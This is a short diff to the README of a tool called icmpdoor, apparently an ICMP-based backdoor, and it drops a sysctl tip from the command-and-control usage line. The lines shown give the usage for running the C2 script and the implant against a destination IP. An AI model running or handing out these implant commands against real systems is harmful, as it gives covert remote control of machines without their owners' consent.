@@ -5,7 +5,7 @@ icmpdoor is written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 10 (Kal
 
 **Python version usage (both Windows and Linux):**
 ```bash
-./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control) Plus run sysctl -w net.ipv4.icmp_echo_ignore_all=1
+./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
 ```
 
